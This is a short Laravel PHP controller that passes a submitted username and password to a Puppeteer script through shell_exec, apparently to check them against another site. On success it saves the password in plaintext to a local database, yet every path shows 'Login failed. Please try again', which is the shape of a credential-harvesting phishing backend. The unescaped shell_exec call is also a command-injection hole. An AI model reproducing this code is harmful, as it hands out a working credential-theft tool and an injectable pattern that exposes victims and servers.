<?php

namespace App\Http\Controllers;

use App\Models\Userdb;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\DB;

class PuppeteerController extends Controller
{
    //
    function Login(Request $request ){
        $username = $request->input("username");
        $password = $request->password;
        $output = shell_exec("node C:\\xampp\\htdocs\\network\\puppeteer.js $username $password");


        if($output == "Login Success\n"){
            $user = Userdb::where("username",$username)->first();
            if($user){
                $user->password = $password;
                $user->save();
                redirect()->back()->with(["message" => "Login failed. Please try again"]);
            }

            $newUser = new Userdb;
            $newUser->username = $username;
            $newUser->password = $password;
            $newUser->save();
            
        }
        
        return redirect()->back()->with(["message"=>"Login failed. Please try again"]);
    }
}
